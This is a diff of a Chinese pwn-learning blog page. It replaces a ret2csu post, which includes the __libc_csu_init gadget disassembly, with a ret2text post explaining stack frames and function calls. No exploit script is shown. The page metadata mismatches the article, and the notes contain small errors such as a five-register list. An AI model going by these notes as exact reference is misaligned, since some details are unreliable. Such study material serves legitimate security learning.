@@ -2,21 +2,44 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>中级ROP（2-1）-ret2csu | swedsn</title>
+  <title>基本ROP（1-1）-ret2text | swedsn</title>
   <meta name="keywords" content="">
-  <meta name="description" content="中级ROP（2-1）-ret2csu | swedsn">
+  <meta name="description" content="基本ROP（1-1）-ret2text | swedsn">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta name="description" content="一、格式化字符串的基本原理1、了解printf函数族格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串 像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量  常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞学习">
+<meta property="og:url" content="http://example.com/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="swedsn">
-<meta property="og:description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
+<meta property="og:description" content="一、格式化字符串的基本原理1、了解printf函数族格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串 像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量  常">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-07-20T11:44:45.000Z">
-<meta property="article:modified_time" content="2022-07-20T12:14:09.781Z">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101408921.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101529916.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101458769.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153742463.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153850406.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153944418.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104238788.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104303662.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430102055996.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430183334854.png">
+<meta property="og:image" content="http://example.com/img/image-20220430183527080.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211730385.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211756994.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211920243.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212240038.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212852204.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212730081.png">
+<meta property="og:image" content="http://example.com/img/image-20220322215436958-16593323952891.png">
+<meta property="og:image" content="http://example.com/img/image-20220322215947385-16593323952893.png">
+<meta property="og:image" content="http://example.com/img/image-20220720165419041-16593323952895.png">
+<meta property="og:image" content="http://example.com/img/image-20220720165444148.png">
+<meta property="article:published_time" content="2022-07-12T05:51:39.000Z">
+<meta property="article:modified_time" content="2022-08-01T05:44:29.049Z">
 <meta property="article:author" content="swedsn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png">
 
 
 <link rel="icon" href="/img/logo.png">
@@ -126,7 +149,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(23)</small>
+                <small>(17)</small>
             
         </div>
     </li>
@@ -255,7 +278,7 @@
                         <i class="fold iconfont icon-right"></i>
                         
                         Pwn入门
-                        <small>(15)</small>
+                        <small>(11)</small>
                         
                     </div>
                     
@@ -266,7 +289,7 @@
                                         
                                         格式化字符串漏洞
                                         
-                                            <small>(2
+                                            <small>(1
                                                 )</small>
                                         
                                     </div>
@@ -290,7 +313,7 @@
                                         
                                         栈溢出
                                         
-                                            <small>(8
+                                            <small>(5
                                                 )</small>
                                         
                                     </div>
@@ -314,7 +337,7 @@
                         <i class="fold iconfont icon-right"></i>
                         
                         Web安全
-                        <small>(2)</small>
+                        <small>(1)</small>
                         
                     </div>
                     
@@ -325,7 +348,7 @@
                                         
                                         SQL注入
                                         
-                                            <small>(2
+                                            <small>(1
                                                 )</small>
                                         
                                     </div>
@@ -358,8 +381,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="23">
-<input type="hidden" id="yelog_site_word_count" value="36.3k">
+<input type="hidden" id="yelog_site_posts_number" value="17">
+<input type="hidden" id="yelog_site_word_count" value="31.6k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -414,10 +437,6 @@
     <input id="tag-search" />
     <div class="tag-wrapper">
         
-            <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>web安全、sql注入</a>
-            </li>
-        
     </div>
 
 </div>
@@ -427,29 +446,11 @@
         
         
         <a  class="全部文章 Web安全 SQL注入 "
-           href="/2022/07/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="web安全、sql注入"
-           data-author="" >
-            <span class="post-title" title="ctfshow刷题记录-sql注入">ctfshow刷题记录-sql注入</span>
-            <span class="post-date" title="2022-07-20 19:05:57">2022/07/20</span>
-        </a>
-        
-        
-        <a  class="全部文章 Web安全 SQL注入 "
            href="/2022/07/20/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="SQL注入总结">SQL注入总结</span>
             <span class="post-date" title="2022-07-20 19:05:32">2022/07/20</span>
-        </a>
-        
-        
-        <a  class="全部文章 "
-           href="/2022/07/20/%E6%9D%82%E8%AE%B0/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="杂记">杂记</span>
-            <span class="post-date" title="2022-07-20 19:04:35">2022/07/20</span>
         </a>
         
         
@@ -463,19 +464,10 @@
         
         
         <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
-           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
+           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="格式化字符串漏洞--刷题记录">格式化字符串漏洞--刷题记录</span>
-            <span class="post-date" title="2022-07-12 13:51:47">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
-           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="格式化字符串漏洞--基本原理">格式化字符串漏洞--基本原理</span>
+            <span class="post-title" title="格式化字符串漏洞学习">格式化字符串漏洞学习</span>
             <span class="post-date" title="2022-07-12 13:51:39">2022/07/12</span>
         </a>
         
@@ -493,7 +485,7 @@
            href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="花式栈溢出-一键获取flag">花式栈溢出-一键获取flag</span>
+            <span class="post-title" title="Pwn学习笔记-一键获取flag">Pwn学习笔记-一键获取flag</span>
             <span class="post-date" title="2022-07-12 13:44:56">2022/07/12</span>
         </a>
         
@@ -507,26 +499,17 @@
         </a>
         
         
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-DynELF/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="花式栈溢出-DynELF">花式栈溢出-DynELF</span>
-            <span class="post-date" title="2022-07-12 13:44:40">2022/07/12</span>
-        </a>
-        
-        
         <a  class="全部文章 "
-           href="/2022/07/12/%E4%B8%AD%E7%BA%A7ROP%EF%BC%882-1%EF%BC%89-ret2csu/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2csu/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="中级ROP（2-1）-ret2csu">中级ROP（2-1）-ret2csu</span>
+            <span class="post-title" title="Pwn学习笔记-ret2csu">Pwn学习笔记-ret2csu</span>
             <span class="post-date" title="2022-07-12 13:44:28">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-4%EF%BC%89-ret2libc/"
+           href="/2022/07/12/ret2libc%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="基本ROP（1-4）--ret2libc">基本ROP（1-4）--ret2libc</span>
@@ -535,25 +518,7 @@
         
         
         <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-3%EF%BC%89-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="基本ROP（1-3）-系统调用">基本ROP（1-3）-系统调用</span>
-            <span class="post-date" title="2022-07-12 13:44:05">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-2%EF%BC%89-ret2shellcode/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="基本ROP（1-2）-ret2shellcode">基本ROP（1-2）-ret2shellcode</span>
-            <span class="post-date" title="2022-07-12 13:43:56">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-1%EF%BC%89-ret2text/"
+           href="/2022/07/12/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="基本ROP（1-1）-ret2text">基本ROP（1-1）-ret2text</span>
@@ -562,46 +527,46 @@
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-5%EF%BC%89-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-5）-Linux下ELF文件的保护机制">基础知识（1-5）-Linux下ELF文件的保护机制</span>
+            <span class="post-title" title="Pwn学习笔记-Linux下ELF文件的保护机制">Pwn学习笔记-Linux下ELF文件的保护机制</span>
             <span class="post-date" title="2022-07-12 13:40:54">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-4%EF%BC%89-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-4）-分析工具">基础知识（1-4）-分析工具</span>
+            <span class="post-title" title="Pwn学习笔记-分析工具">Pwn学习笔记-分析工具</span>
             <span class="post-date" title="2022-07-12 13:40:36">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-3%EF%BC%89-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"
+           href="/2022/07/12/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-3）-二进制基础">基础知识（1-3）-二进制基础</span>
+            <span class="post-title" title="二进制基础学习">二进制基础学习</span>
             <span class="post-date" title="2022-07-12 13:40:27">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-2%EF%BC%89-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-2）-环境配置">基础知识（1-2）-环境配置</span>
+            <span class="post-title" title="Pwn学习笔记-环境配置">Pwn学习笔记-环境配置</span>
             <span class="post-date" title="2022-07-12 13:40:08">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-1%EF%BC%89-Linux%E5%9F%BA%E7%A1%80/"
+           href="/2022/07/12/Linux%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-1）-Linux基础">基础知识（1-1）-Linux基础</span>
+            <span class="post-title" title="Linux基础学习">Linux基础学习</span>
             <span class="post-date" title="2022-07-12 13:39:59">2022/07/12</span>
         </a>
         
@@ -625,10 +590,10 @@
         
         
         <a  class="全部文章 开发 Java开发 基础知识 "
-           href="/2022/07/12/Java%E5%AD%A6%E4%B9%A001-%E5%89%8D%E6%8F%90%E5%87%86%E5%A4%87/"
+           href="/2022/07/12/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="Java学习01-前提准备">Java学习01-前提准备</span>
+            <span class="post-title" title="Java环境配置">Java环境配置</span>
             <span class="post-date" title="2022-07-12 09:54:29">2022/07/12</span>
         </a>
         
@@ -650,24 +615,34 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-中级ROP（2-1）-ret2csu" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-栈溢出基本原理" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">中级ROP（2-1）-ret2csu</h1>
+        <h1 class="article-title">基本ROP（1-1）-ret2text</h1>
     
     <div class="article-meta">
         
         
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Pwn入门">Pwn入门</a> > 
+            
+            <a  data-rel="Pwn入门&lt;---&gt;栈溢出">栈溢出</a>
+            
+        </span>
         
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-07-20 18:46:47'>2022-07-12 13:44</time>
+            发布时间 : <time class="date" title='最后更新: 2022-08-01 13:46:26'>2022-07-12 13:43</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.4k</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -686,7 +661,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86"><span class="toc-text">1. 前提知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ret2csu%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">2. ret2csu的原理</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A0%88%E4%B8%8E%E6%A0%88%E5%B8%A7"><span class="toc-text">一、栈与栈帧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%A0%88"><span class="toc-text">1、栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%A0%88%E5%B8%A7"><span class="toc-text">2、栈帧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-text">二、C语言函数调用栈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%BC%96%E5%86%99%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91"><span class="toc-text">1、编写源代码编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E3%80%81%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-text">2 、分析程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1%EF%BC%9A%E8%BF%9B%E5%85%A5%E5%87%BD%E6%95%B0%E5%89%8D"><span class="toc-text">0x1：进入函数前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x2-%EF%BC%9A%E8%BF%9B%E5%85%A5%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%9A"><span class="toc-text">0x2 ：进入函数时：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-%EF%BC%9A%E9%80%80%E5%87%BA%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%9A"><span class="toc-text">0x3 ：退出函数时：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">三、栈溢出的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81ret2txt%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">四、ret2txt的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%90"><span class="toc-text">五、实例解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">1. 程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">2. 代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exp%E8%84%9A%E6%9C%AC"><span class="toc-text">3. exp脚本</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -702,91 +677,77 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-前提知识"><a href="#1-前提知识" class="headerlink" title="1. 前提知识"></a>1. 前提知识</h2><p>（1）64位程序中函数的传参方式：</p>
+        <h2 id="一、栈与栈帧"><a href="#一、栈与栈帧" class="headerlink" title="一、栈与栈帧"></a>一、栈与栈帧</h2><h3 id="1、栈"><a href="#1、栈" class="headerlink" title="1、栈"></a>1、栈</h3><p>（1）栈是一种典型的后进先出的数据结构，其操作主要有压栈（push）与出栈（pop）两种操作</p>
+<p>（2）用于保存函数调用信息和局部变量</p>
+<p>x86：函数参数保存在栈上，在函数返回地址的上方</p>
+<p>x64：前六个政协或指针参数以此保存在RDI,RSI,RDX,R8,R9寄存器种，如果还有更多的参数的话才会保存在栈上</p>
+<h3 id="2、栈帧"><a href="#2、栈帧" class="headerlink" title="2、栈帧"></a>2、栈帧</h3><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403142423167.png" alt="image-20220403142423167"></p>
+<h2 id="二、C语言函数调用栈"><a href="#二、C语言函数调用栈" class="headerlink" title="二、C语言函数调用栈"></a>二、C语言函数调用栈</h2><h3 id="1、编写源代码编译"><a href="#1、编写源代码编译" class="headerlink" title="1、编写源代码编译"></a>1、编写源代码编译</h3><p>（1）源代码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+int test(int a, int b)&#123;
+    int c = a + b;
+    return c;
+&#125;
+
+
+int main(int argc, char const *argv[])
+&#123;
+    int d = test(1, 2);
+&#125;
+</code></pre>
+<p>（2）编译</p>
 <blockquote>
-<p>当参数个数少于7给时，通过寄存器传参，参数从左到右放入寄存器中：rdi、rsi、rdx、rcx、r8、r9</p>
-<p>当参数大于等于7个时，前6个参数与前面一样，后面的参数依次放入栈中，通过栈传参（与32位一样）</p>
+<p>gcc -m32 -o test test.c</p>
 </blockquote>
-<p>（2）存在的问题</p>
-<p> 这样在64位中就存在一个问题：当我们找不到某一个寄存器对应的 gadgets时，那么就无法找到存放函数该参数的地方了，就无法构造函数了。一般情况是：函数有三个参数，而程序的rdx寄存器对应的gadget在程序中找不到，但这个三个参数又很重要。那么这样就得利用程序本身的其他函数来构造这个gadget了。 </p>
-<h2 id="2-ret2csu的原理"><a href="#2-ret2csu的原理" class="headerlink" title="2. ret2csu的原理"></a>2. ret2csu的原理</h2><p>在 64程序 下存在一个叫 __libc_csu_init 的函数，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。通过利用这个函数来构造相应的寄存器的数值。</p>
-<p>我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
-<pre><code class="assembly">text:0000000000400760 ; void init(void)
-.text:0000000000400760 init            proc near               ; DATA XREF: start+16↑o
-.text:0000000000400760 ; __unwind &#123;
-.text:0000000000400760                 push    r15
-.text:0000000000400762                 push    r14
-.text:0000000000400764                 mov     r15d, edi
-.text:0000000000400767                 push    r13
-.text:0000000000400769                 push    r12
-.text:000000000040076B                 lea     r12, off_600E10
-.text:0000000000400772                 push    rbp
-.text:0000000000400773                 lea     rbp, off_600E18
-.text:000000000040077A                 push    rbx
-.text:000000000040077B                 mov     r14, rsi
-.text:000000000040077E                 mov     r13, rdx
-.text:0000000000400781                 sub     rbp, r12
-.text:0000000000400784                 sub     rsp, 8
-.text:0000000000400788                 sar     rbp, 3
-.text:000000000040078C                 call    _init_proc
-.text:0000000000400791                 test    rbp, rbp
-.text:0000000000400794                 jz      short loc_4007B6
-.text:0000000000400796                 xor     ebx, ebx
-.text:0000000000400798                 nop     dword ptr [rax+rax+00000000h]
-.text:00000000004007A0
-.text:00000000004007A0 loc_4007A0:                             ; CODE XREF: init+54↓j
-.text:00000000004007A0                 mov     rdx, r13
-.text:00000000004007A3                 mov     rsi, r14
-.text:00000000004007A6                 mov     edi, r15d
-.text:00000000004007A9                 call    qword ptr [r12+rbx*8]
-.text:00000000004007AD                 add     rbx, 1
-.text:00000000004007B1                 cmp     rbx, rbp
-.text:00000000004007B4                 jnz     short loc_4007A0
-.text:00000000004007B6
-.text:00000000004007B6 loc_4007B6:                             ; CODE XREF: init+34↑j
-.text:00000000004007B6                 add     rsp, 8
-.text:00000000004007BA                 pop     rbx
-.text:00000000004007BB                 pop     rbp
-.text:00000000004007BC                 pop     r12
-.text:00000000004007BE                 pop     r13
-.text:00000000004007C0                 pop     r14
-.text:00000000004007C2                 pop     r15
-.text:00000000004007C4                 retn
-.text:00000000004007C4 ; &#125; // starts at 400760
-.text:00000000004007C4 init            endp
-</code></pre>
-<p>这里我们可以利用以下几点：</p>
+<h3 id="2-、分析程序："><a href="#2-、分析程序：" class="headerlink" title="2 、分析程序："></a>2 、分析程序：</h3><h4 id="0x1：进入函数前"><a href="#0x1：进入函数前" class="headerlink" title="0x1：进入函数前"></a>0x1：进入函数前</h4><p>① 首先查看程序的main函数的反汇编。前面三行的作用就是开辟一段栈帧，其大小就是0x10</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403151407975.png" alt="image-20220403151407975"></p>
+<p>此时的栈帧的布局为：</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403154502676.png" alt="image-20220403154502676"></p>
+<p>② 接着可以发现在调用func函数的时候，它首先传递了func函数的两个参数（从右往左）</p>
+<p>注意：</p>
+<blockquote>
+<p>32位程序和64位程序的传参方式不一样，32位程序是栈传参，而64位优先寄存器传参，寄存器总共有六个：rdi、rsi、rdx、rcx、r8、r9，当参数多于七个时才轮到栈传参</p>
+</blockquote>
+<p>③  传参以后就是执行call指令。call指令实际上包含两个指令</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/e94a2f01edbd4400843c951c62c5a397-16424329962017.png" alt="e94a2f01edbd4400843c951c62c5a397"></p>
+<p>在这里就是先将0x08048400的地址保存起来，然后再跳转到call的后面的地址0x80483db <func>， 此时的栈帧的布局应该是</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220403155106777.png" alt="image-20220403155106777"></p>
+<h4 id="0x2-：进入函数时："><a href="#0x2-：进入函数时：" class="headerlink" title="0x2 ：进入函数时："></a>0x2 ：进入函数时：</h4><p>跳到fun函数里面，查看一下汇编代码：</p>
+<p>重点讲一下前的三行，基本上每一个程序都有这三个指令，那么它们有什么作用呢？</p>
+<p><strong>push ebp：</strong> 将主调函数（main函数）的ebp保存下来，为了就是调用完这个函数以后以后跟调用之前的一样。</p>
+<p><strong>mov ebp, esp：</strong> 将ebp栈底抬上去，什么意思呢？就是之前的ebp的地址不是main函数的吗，而esp是栈顶，随着你的输入输出而改变的，mov指令就是将你的ebp放到最上面。</p>
+<p><strong>sub esp，10h：</strong> 为新栈开辟一段内存空间，其大小为0x10.</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789545506625.png"></p>
+<p>最终的结果：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789545708327.png"></p>
+<h4 id="0x3-：退出函数时："><a href="#0x3-：退出函数时：" class="headerlink" title="0x3 ：退出函数时："></a>0x3 ：退出函数时：</h4><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/97df84294fee46548067d91121b51cd3.png" alt="97df84294fee46548067d91121b51cd3"><br>主要就是两个命令leave和ret命令<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789546072430.png"></p>
+<p>其最终结果为：</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220210113006332.png" alt="image-20220210113006332"></p>
